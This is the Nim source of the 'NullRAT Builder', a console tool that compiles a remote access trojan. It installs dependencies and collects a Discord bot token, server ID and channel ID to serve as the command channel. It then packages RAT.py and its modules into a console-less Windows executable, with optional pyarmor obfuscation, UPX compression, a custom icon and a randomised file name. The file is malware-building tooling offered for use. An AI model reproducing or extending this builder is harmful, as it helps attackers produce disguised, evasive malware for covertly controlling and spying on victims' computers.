import std/terminal
import std/os
import std/osproc
import std/random
import std/envvars
import std/[strutils, strformat]
import puppy
import std/streams

randomize()

# Windows-only
proc cls() = 
    discard execShellCmd("cls")
    
discard execShellCmd("title NullRAT Builder");
discard execShellCmd("chcp 65001 & color 4");
discard execShellCmd("mode con: cols=80 lines=29");

proc cleanWorkingDir() =
    echo ""
    var dirrr = getAppDir();
    setCurrentDir(dirrr);
    echo getCurrentDir();
    if dirExists(absolutePath("NullRAT")):
        createDir("NullRAT2")
        moveFile(absolutePath("NullRAT" / "custom_icon.ico"), dirrr / "NullRAT2" / "custom_icon.ico")
        moveFile(absolutePath("NullRAT" / "RAT.py"), dirrr / "NullRAT2" / "RAT.py")
        moveDir(absolutePath("NullRAT" / "modules"), dirrr / "NullRAT2" / "modules")
        moveDir(absolutePath("NullRAT" / "upx"), dirrr / "NullRAT2" / "upx")
        # check existing variables
        if fileExists(absolutePath("NullRAT" / "Variables.py")):
            var inp: char = getch()
            echo "Existing Variables file found! Preserve? (y/N)"
            inp = getch()
            if inp == 'Y' or inp == 'y':
                moveFile(absolutePath("NullRAT" / "Variables.py"), dirrr / "NullRAT2" / "Variables.py")
        removeDir("NullRAT")
        moveDir(dirrr / "NullRAT2", dirrr / "NullRAT")
    removeFile("AIO.bat")
    removeFile("AIO_Legacy.bat")
        
    # remove git stuff if downloaded from source
    if dirExists(absolutePath(".git")):
        echo "Remove git files? (y/N)"
        var inpu: char = getch()
        if inpu == 'y' or inpu == 'Y':
            removeDir(".git")
            removeFile("README.md")
            removeFile("Getting Variables.md")
            removeFile(".gitignore")

    removeFile("RAT.exe")
    removeDir("build")
    removeDir("dist")        
    
    cls()
    
proc printName() = 
    cls()
    echo ""
    stdout.styledWriteLine(fgRed, "  ███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗  █████╗ ████████╗")
    stdout.styledWriteLine(fgRed, "  ████╗  ██║██║   ██║██║     ██║     ██╔══██╗██╔══██╗╚══██╔══╝")
    stdout.styledWriteLine(fgRed, "  ██╔██╗ ██║██║   ██║██║     ██║     ██████╔╝███████║   ██║")
    stdout.styledWriteLine(fgRed, "  ██║╚██╗██║██║   ██║██║     ██║     ██╔══██╗██╔══██║   ██║")
    stdout.styledWriteLine(fgRed, "  ██║ ╚████║╚██████╔╝███████╗███████╗██║  ██║██║  ██║   ██║")
    stdout.styledWriteLine(fgRed, "  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝")
    stdout.styledWriteLine(fgRed, "  =========================================================")
    echo ""

proc compiler(): int = 
    printName()
    var dirr = getAppDir()
    setCurrentDir(dirr / "NullRAT")
    
    stdout.styledWriteLine({styleBright}, "  >> Stub Compiler <<")
    echo ""
    var obfuscate: bool
    var compress: bool
    var icon: bool = false
        
    stdout.styledWriteLine({styleBright}, "Do you want to obfuscate the executable? (Y/n)")
    var input: char = getch()
    if input == 'N' or input == 'n': obfuscate = false
    elif input == 'Q' or input == 'q': return 0
    else: obfuscate = true
    
    stdout.styledWriteLine({styleBright}, "Do you want to compress the executable? (Y/n)")
    input = getch()
    if input == 'N' or input == 'n': compress = false
    elif input == 'Q' or input == 'q': return 0
    else: compress = true
    
    stdout.styledWriteLine({styleBright}, "Do you want to set a custom icon? (y/N)")
    input = getch()
    var iconPath: string
    if input == 'Y' or input == 'y': 
        icon = true
        echo "Drag and drop .ico file here, and press ENTER..."
        echo "(Or type it's full path)"
        iconPath = readLine(stdin);
        iconPath = iconPath.strip();
        while fileExists(iconPath) == false:
            echo "Icon file not found! Please try again."
            iconPath = readLine(stdin)
    elif input == 'Q' or input == 'q': return 0
    else: icon = false

    printName()
    echo "All options selected: "
    echo "---------------------"
    if obfuscate: echo "Executable will be obfuscated (w/ pyarmor)"
    if compress:
        var path = getEnv("path")
        if path[^1] == ';':
            putEnv("path", fmt"{path}{dirr}\NullRAT\upx;")
        else:
            putEnv("path", fmt"{path};{dirr}\NullRAT\upx;")
        echo "Executable will be compressed (w/ upx)"
    if icon: 
        echo "Executable will have custom icon"
        echo "Path: ", iconPath
    echo ""
    stdout.styledWriteLine(fgRed, {styleBright}, "Would you like to compile now? (Y/n)")
    input = getch()
    if input == 'N' or input == 'n':
        echo "- User declined request. Aborting..."
        sleep(1500)
        return 0
    elif input == 'Q' or input == 'q': return 0
    else:
        stdout.styledWriteLine(fgCyan, {styleBright}, "- Compiling using selected settings...")
        stdout.styledWriteLine(fgCyan, {styleBright}, "- Checking pyinstaller...")
        var pyinst: string = "undef";
        var armor: string = "undef";
        # Find working pyinstaller executable
        var wherePy: seq[string]
        try:
            wherePy = splitLines(execCmdEx("where pyinstaller").output)
            for pyinstaller in wherePy:
                if pyinstaller == "": continue
                var code = execCmdEx(pyinstaller).exitCode
                if code == 2:
                    pyinst = pyinstaller
                    break
            if "undef" notin pyinst:
                echo "Found! ", pyinst
            else:
                echo "[FATAL] Pyinstaller executable not found."
                echo "Please check your environment variables and python installation"
                echo "before continuing..... Exiting in 5 seconds"
                sleep(5000)
                return 0
        except OSError:
            # Modules not in path, try to find scripts directory
            echo "Pyinstaller executable not found"
            echo "Attempting to locate the executable in AppData....."
            var localappdata = getEnv("localappdata")
            for path in walkDirRec(localappdata):
                if "pyinstaller" in path:
                    echo "Found!", path
                    pyinst = path
                    break
            var roamingappdata = getEnv("appdata")
            for path in walkDirRec(roamingappdata):
                if "pyinstaller" in path:
                    echo "Found!", path
                    pyinst = path
                    break
            if "undef" in pyinst:
                echo "[FATAL] Pyinstaller executable not found."
                echo "Please check your environment variables and python installation"
                echo "before continuing..... Exiting in 5 seconds"
                sleep(5000)
                return 0
                
        stdout.styledWriteLine(fgCyan, {styleBright}, "- Checking pyarmor...")
        # Find working pyarmor executable
        try: 
            var whereArmor = splitLines(execCmdEx("where pyarmor-7").output)
            for pyarmor in whereArmor:
                if pyarmor == "": continue
                var code = execCmdEx(pyarmor).exitCode
                if code == 2:
                    armor = pyarmor
                    break
            if "undef" notin armor:
                echo "Found! ", armor
            else:
                echo "[FATAL] Pyarmor executable not found."
                echo "Please check your environment variables and python installation"
                echo "before continuing..... Exiting in 5 seconds"
                sleep(5000)
                return 0
        except OSError:
            # Modules not in path, try to find scripts directory
            echo "Pyarmor executable not found"
            echo "Attempting to locate the executable in AppData....."
            var localappdata = getEnv("localappdata")
            for path in walkDirRec(localappdata):
                if "armor" in path:
                    echo "Found!", path
                    armor = path
                    break
            var roamingappdata = getEnv("appdata")
            for path in walkDirRec(roamingappdata):
                if "armor" in path:
                    echo "Found!", path
                    armor = path
                    break
            if "undef" in pyinst:
                echo "[FATAL] Pyarmor executable not found."
                echo "Please check your environment variables and python installation"
                echo "before continuing..... Exiting in 5 seconds"
                sleep(5000)
                return 0
            
        # Compiling
        stdout.styledWriteLine(fgCyan, {styleBright}, "- Creating tempdir...")
        var folderName = "compiling-" & $rand(6969)
        createDir(folderName)
        setCurrentDir(dirr / "NullRAT" / folderName)
        var currdir = getCurrentDir()
        echo currdir
        
        echo dirr / "NullRAT" / "RAT.py"
        copyFile(dirr / "NullRAT" / "RAT.py", currdir / "RAT.py")
        echo dirr / "NullRAT" / "Variables.py"
        copyFile(dirr / "NullRAT" / "Variables.py", currdir / "Variables.py")
        if icon:
            copyFile(iconPath, currdir / "custom_icon.ico")
            
        var modules: seq[string]
        for path in walkDir(dirr / "NullRAT" / "modules"):
            if "create_new" in $path.path.split("\\")[^1]:
                continue
            echo $path.path
            copyFile($path.path, currdir / $path.path.split("\\")[^1])
            modules.add($path.path.split("\\")[^1])

        var pyinst_cmd = pyinst & " --onefile --noconsole --hidden-import mss"
        
        var dat: string 
        if obfuscate:
            dat = fmt" --add-data 'Variables.py;.'"
        else:
            dat = fmt" --add-data ""Variables.py;."""
            pyinst_cmd.add(dat)
        
        var pyarmor_cmd: string
        if icon:
            if obfuscate:
                pyarmor_cmd = armor & fmt" pack --clean -e "" --onefile --noconsole --icon=custom_icon.ico --hidden-import mss {dat}"""
            else:
                pyinst_cmd = pyinst_cmd & " --icon=custom_icon.ico"
        pyarmor_cmd = armor & fmt" pack --clean -e "" --onefile --noconsole --hidden-import mss {dat}"
        moveFile(currdir / "RAT.py", currdir / "765678976567.py")
        pyarmor_cmd.add(dat)

        if obfuscate:
            for m in modules:
                dat = fmt" --add-data '{m};.'"
                pyarmor_cmd.add(dat)
        else:
            for m in modules:
                dat = fmt" --add-data ""{m};."""
                pyinst_cmd.add(dat)
            
        pyinst_cmd.add(" 765678976567.py")
        pyarmor_cmd.add("""" 765678976567.py""")
        
        discard execShellCmd("color C")
        if obfuscate: 
            echo pyarmor_cmd
            discard execShellCmd(pyarmor_cmd)
        else: 
            echo pyinst_cmd
            discard execShellCmd(pyinst_cmd)
        
        var name = $rand(6969) & ".exe"
        if fileExists(currdir / "dist" / "765678976567.exe"):
            moveFile(currdir / "dist" / "765678976567.exe", dirr / name)
        setCurrentDir(dirr / "NullRAT")
        removeDir(folderName)
        
        printName()
        stdout.styledWriteLine(fgGreen, {styleBright},  "Build Successful! Output in " & name)
        echo "Press any key to exit..."
        discard getch()
        quit(0)
    
proc variablesCreator(x: int) = 
    printName()
    var dirr = getAppDir()
    setCurrentDir(dirr / "NullRAT")
    
    if x != 1:
        stdout.styledWriteLine({styleBright}, "  >> Variables Creator <<")
        if fileExists("Variables.py"):
            stdout.styledWriteLine(fgGreen, {styleBright}, "\n- Existing Variables file discovered!")
            stdout.styledWriteLine(fgCyan, {styleBright}, "\nStored information\n------------------")
            let EnF = readFile("Variables.py")
            stdout.styledWriteLine(fgCyan, {styleBright}, EnF)
            stdout.styledWriteLine({styleBright}, "\nIs this information correct? (Y/n)")
            var input: char = getch()
            if input == 'N' or input == 'n':
                echo "- Information marked incorrect! Continuing..."
                sleep(1000)
                printName()
            elif input == 'Q' or input == 'q': return 
            else:
                stdout.styledWriteLine(fgGreen, {styleBright}, "- Information marked correct. Preserving...")
                sleep(1000)
                if compiler() == 0:
                    return 

    stdout.styledWriteLine(fgWhite, {styleBright}, "----------------\nTo know how to obtain the variables,\nCheck 'Getting Variables.md' in NullRAT Github\n----------------")
    stdout.styledWriteLine(fgWhite, {styleBright}, "\n[1] Please enter the Discord bot token: ")
    var token = readLine(stdin);
    stdout.styledWriteLine(fgWhite, {styleBright}, "[2] Please enter the Server ID: ")
    var serverID = readLine(stdin)
    stdout.styledWriteLine(fgWhite, {styleBright}, "[3] Please enter the Notification channel ID: ")
    var notificationID = readLine(stdin)
        
    let lines = [
        fmt"bot_token = ""{token}""",
        "notification_channel = " & notificationID,
        "server_ids = [" & serverID & "]"
    ]
    
    var linesString: string = "# This file was auto-generated by NullRAT Builder. DO NOT EDIT!\n"

    printName()
    stdout.styledWriteLine({styleBright}, "  >> Variables Creator <<")
    echo "\nObtained information:\n---------------------"

    for line in lines:
        if "#" in line: continue
        echo line
        linesString.add("\n"&line)
    echo ""

    stdout.styledWriteLine({styleBright}, "Is this information correct? (Y/n)")
    var input: char = getch()
    if input == 'N' or input == 'n':
        echo "- Aborted! Returning to main menu..."
        sleep(1500)
        variablesCreator(1)
    elif input == 'Q' or input == 'q': return 
    else:
        echo "- Information marked correct. Writing..."
        removeFile("Variables.py")
        
        echo linesString
        let
          fileName = "Variables.py"
          str = linesString
        writeFile(fileName, str)

        stdout.styledWriteLine({styleBright}, "- Written information to disk!")
        echo ""
        stdout.styledWriteLine({styleBright}, "Moving on to compiler...")
        sleep(3000)
        if compiler() == 0:
            return

const pipModules = ["pyinstaller==4.10", "virtualenv", "disnake", "requests", "pyarmor", "mss"]
         
proc packageInstaller() = 
    printName()
    stdout.styledWriteLine({styleBright}, "  >> Dependencies Installer <<")
    echo ""
    stdout.styledWriteLine({styleBright}, "[1] Checking for Python...")
    var status: int = execShellCmd("python --version")
    var status2: int = execShellCmd("py --version")
    if status == 0 or status2 == 0:
        stdout.styledWriteLine(fgGreen, {styleBright}, "- Python installed!")
        echo ""
        stdout.styledWriteLine({styleBright}, "[2] Checking if packages already installed...")
        var result = execCmdEx("dism")
        try:
            result = execCmdEx("pip freeze")
        except OSError:
            result = execCmdEx("py -m pip freeze")
        var allInstalled: bool = true
        if result.exitCode != 0:
            echo "[FATAL] pip command failed to execute!!"
            sleep(2000)
        else:
            for module in pipModules:
                if module notin result.output:
                    echo "Some dependencies are not installed!"
                    allInstalled = false
            
            if allInstalled:
                stdout.styledWriteLine(fgGreen, {styleBright}, "- All packages installed and detected!\n\nProceeding on with variables creation...")
                sleep(1000)
                variablesCreator(0)
            else:
                stdout.styledWriteLine({styleBright}, "[3] Installing/Updating dependencies...")
                var res = execShellCmd("pip install pyinstaller==4.10 virtualenv aiohttp disnake requests mss pyarmor")
                if res == 0:
                    echo "========================"
                    stdout.styledWriteLine(fgGreen, {styleBright}, "All Installed!\nMoving to variables creation...")
                    sleep(2000)
                    variablesCreator(0)
                else:
                    var res = execShellCmd("py -m pip install pyinstaller==4.10 virtualenv aiohttp disnake requests mss pyarmor")
                    if res == 0:
                        echo "========================"
                        stdout.styledWriteLine(fgGreen, {styleBright}, "All Installed!\nMoving to variables creation...")
                        sleep(2000)
                        variablesCreator(0)
    else:
        stdout.styledWriteLine({styleBright}, "- Python not installed!\n\nWould you like to download the recommended python installer? (Y/n): ")
        var input: char = getch();
        if input == 'N' or input == 'n':
            echo "NullRAT Builder cannot continue otherwise!!! Exiting in 5 seconds..."
            sleep(5000)
            quit(1)
        elif input == 'Q' or input == 'q': return 
        else:
            var dirr = getAppDir()
            stdout.styledWriteLine({styleBright}, "Downloading installer to current directory....")
            let response = get("http://www.python.org/ftp/python/3.8.10/python-3.8.10.exe", @[("Content-Type", "application/x-msdownload")])
            var strm = newFileStream("python-setup.exe", fmWrite)
            strm.write(response.body)
            strm.close()
            stdout.styledWriteLine(fgGreen, {styleBright}, "Downloaded! https://www.python.org/ftp/python/3.8.10/python-3.8.10.exe")
            echo ""
            stdout.styledWriteLine({styleBright}, "After running, please tick 'Install for All Users'")
            stdout.styledWriteLine({styleBright}, "and 'Add Python 3.8 to PATH', then Install Now")
            stdout.styledWriteLine({styleBright}, "After installing, check if everything is functional")
            stdout.styledWriteLine({styleBright}, "by running NullRAT builder again.")
            echo ""
            stdout.styledWriteLine({styleBright}, "Returning to menu after installer is closed...")
            discard execCmdEx("python-setup.exe")
            return
    
proc mainMenu() =
    printName();
    stdout.styledWriteLine({styleBright}, "  >> NullRAT Builder v1.1 <<")
    echo ""
    stdout.styledWriteLine(fgGreen, {styleBright}, " - HINT! Press Q in any window to immediately return here!")
    stdout.styledWriteLine({styleBright}, "\n Press any key to continue,\n E/Q to exit,\n R to clear working directory,\n C to directly move to compiler (do this at your own risk)...")
    var input: char = getch();
    if input == 'E' or input == 'e' or input == 'Q' or input == 'q':
        quit(0)
    elif input == 'C' or input == 'c':
        discard compiler()
        quit(0)
    elif input == 'R' or input == 'r':
        cleanWorkingDir()
    else:
        packageInstaller()
            
while true:
    mainMenu();
#stdout.styledWriteLine(fgRed, "")
